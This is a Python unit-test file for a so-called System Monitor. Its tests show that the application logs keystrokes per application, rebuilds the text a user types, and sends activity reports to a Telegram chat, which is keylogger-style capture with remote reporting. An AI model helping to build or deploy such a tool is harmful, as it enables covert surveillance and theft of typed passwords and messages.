"""
Unit tests for the System Monitor application (FIXED)
"""

import tempfile
import time
import unittest
from pathlib import Path
from unittest.mock import Mock, patch

# Import modules to test
from monitor import (
    Config, ProcessCache, ActivityTracker,
    TelegramClient, StorageManager
)


class TestConfig(unittest.TestCase):
    """Test configuration management"""

    def test_config_defaults(self):
        """Test default configuration values"""
        config = Config(
            telegram_token="test_token",
            telegram_chat_id=12345
        )
        self.assertEqual(config.report_interval, 5)
        self.assertEqual(config.max_buffer_size, 1000)
        self.assertEqual(config.retention_days, 7)

    def test_config_custom_values(self):
        """Test custom configuration values"""
        config = Config(
            telegram_token="test_token",
            telegram_chat_id=12345,
            report_interval=10,
            max_buffer_size=500
        )
        self.assertEqual(config.report_interval, 10)
        self.assertEqual(config.max_buffer_size, 500)


class TestProcessCache(unittest.TestCase):
    """Test process caching functionality"""

    def setUp(self):
        self.temp_dir = tempfile.mkdtemp()
        self.cache_file = Path(self.temp_dir) / "test_cache.json"

    def test_cache_initialization(self):
        """Test cache initialization"""
        cache = ProcessCache(self.cache_file)
        self.assertIsInstance(cache.cache, dict)

    def test_cache_persistence(self):
        """Test cache save and load - FIXED"""
        # Create first cache instance and add data
        cache1 = ProcessCache(self.cache_file)
        cache1.cache[1234] = "test_process.exe"
        cache1.cache[5678] = "another_process.exe"
        cache1.save_cache()

        # Verify file was created
        self.assertTrue(self.cache_file.exists())

        # Load in new instance
        cache2 = ProcessCache(self.cache_file)

        # ✅ Test with integer key (not string)
        self.assertEqual(cache2.cache[1234], "test_process.exe")
        self.assertEqual(cache2.cache[5678], "another_process.exe")

        # ✅ Verify keys are integers
        self.assertIsInstance(list(cache2.cache.keys())[0], int)

    @patch('psutil.Process')
    def test_get_process_name(self, mock_process):
        """Test process name retrieval"""
        mock_proc = Mock()
        mock_proc.name.return_value = "TestApp.exe"
        mock_process.return_value = mock_proc

        cache = ProcessCache(self.cache_file)
        name = cache.get_process_name(5678)

        self.assertEqual(name, "testapp.exe")
        self.assertEqual(cache.cache[5678], "testapp.exe")

    def test_cache_with_invalid_json(self):
        """Test cache handles corrupted JSON gracefully"""
        # Write invalid JSON
        with open(self.cache_file, 'w') as f:
            f.write("{invalid json content")

        # Should not crash, should return empty cache
        cache = ProcessCache(self.cache_file)
        self.assertEqual(cache.cache, {})


class TestActivityTracker(unittest.TestCase):
    """Test activity tracking functionality"""

    def setUp(self):
        self.config = Config(
            telegram_token="test",
            telegram_chat_id=123,
            ignore_procs={"ignored.exe"}
        )
        self.tracker = ActivityTracker(self.config)

    def test_keystroke_recording(self):
        """Test keystroke recording"""
        self.tracker.record_keystroke("notepad.exe", "Letters")
        self.tracker.record_keystroke("notepad.exe", "Letters")
        self.tracker.record_keystroke("notepad.exe", "Numbers")

        data = self.tracker.activity_map["notepad.exe"]
        self.assertEqual(data.keystrokes, 3)
        self.assertEqual(data.key_types["Letters"], 2)
        self.assertEqual(data.key_types["Numbers"], 1)

    def test_ignored_processes(self):
        """Test that ignored processes are not tracked"""
        self.tracker.record_keystroke("ignored.exe", "Letters")
        self.assertNotIn("ignored.exe", self.tracker.activity_map)

    def test_activity_time_tracking(self):
        """Test time tracking for applications"""
        self.tracker.current_proc = "test.exe"
        initial_time = self.tracker.hwnd_change_time

        time.sleep(0.1)
        self.tracker.update_activity_time()

        activity_time = self.tracker.activity_map["test.exe"].time
        self.assertGreater(activity_time, 0)
        self.assertLess(activity_time, 1)

    def test_typed_content_update(self):
        """Test typed content buffer management"""
        self.tracker.update_typed_content("H")
        self.tracker.update_typed_content("e")
        self.tracker.update_typed_content("l")
        self.tracker.update_typed_content("l")
        self.tracker.update_typed_content("o")

        self.assertEqual(self.tracker.typed_content['text'], "Hello")

        # Test backspace
        self.tracker.update_typed_content("[backspace]")
        self.assertEqual(self.tracker.typed_content['text'], "Hell")

    def test_report_data_generation(self):
        """Test report data generation"""
        self.tracker.record_keystroke("app1.exe", "Letters")
        self.tracker.record_keystroke("app1.exe", "Numbers")
        self.tracker.record_keystroke("app2.exe", "Letters")

        report = self.tracker.get_report_data()

        self.assertEqual(report['total_keystrokes'], 3)
        self.assertEqual(len(report['active_apps']), 2)
        self.assertEqual(report['active_apps'][0][0], "app1.exe")
        self.assertEqual(report['active_apps'][0][1], 2)


class TestTelegramClient(unittest.TestCase):
    """Test Telegram client functionality"""

    @patch('requests.Session')
    def test_client_initialization(self, mock_session):
        """Test Telegram client initialization"""
        client = TelegramClient("test_token", 12345)
        self.assertEqual(client.token, "test_token")
        self.assertEqual(client.chat_id, 12345)

    @patch('requests.Session')
    def test_availability_check(self, mock_session_class):
        """Test API availability checking"""
        mock_session = Mock()
        mock_response = Mock()
        mock_response.status_code = 200
        mock_session.get.return_value = mock_response
        mock_session_class.return_value = mock_session

        client = TelegramClient("test_token", 12345)
        self.assertTrue(client.check_availability())

    @patch('requests.Session')
    def test_message_chunking(self, mock_session_class):
        """Test long message chunking"""
        mock_session = Mock()
        mock_response = Mock()
        mock_response.status_code = 200
        mock_session.post.return_value = mock_response
        mock_session.get.return_value = mock_response
        mock_session_class.return_value = mock_session

        client = TelegramClient("test_token", 12345)

        # Create a message longer than 4000 characters
        long_message = "x" * 5000
        result = client.send_message(long_message)

        # Should be called twice (once for each chunk)
        self.assertEqual(mock_session.post.call_count, 2)
        self.assertTrue(result)


class TestStorageManager(unittest.TestCase):
    """Test storage management functionality"""

    def setUp(self):
        self.temp_dir = Path(tempfile.mkdtemp())
        self.storage = StorageManager(self.temp_dir)

    def test_directory_creation(self):
        """Test directory creation"""
        self.assertTrue(self.temp_dir.exists())
        self.assertTrue(self.temp_dir.is_dir())

    def test_file_cleanup(self):
        """Test old file cleanup"""
        # Create test files with different ages
        old_file = self.temp_dir / "old_file.txt"
        new_file = self.temp_dir / "new_file.txt"

        old_file.touch()
        new_file.touch()

        # Modify old file's timestamp
        import os
        old_time = time.time() - (8 * 86400)  # 8 days ago
        os.utime(old_file, (old_time, old_time))

        # Clean files older than 7 days
        self.storage.clean_old_files(7)

        self.assertFalse(old_file.exists())
        self.assertTrue(new_file.exists())


if __name__ == '__main__':
    unittest.main()
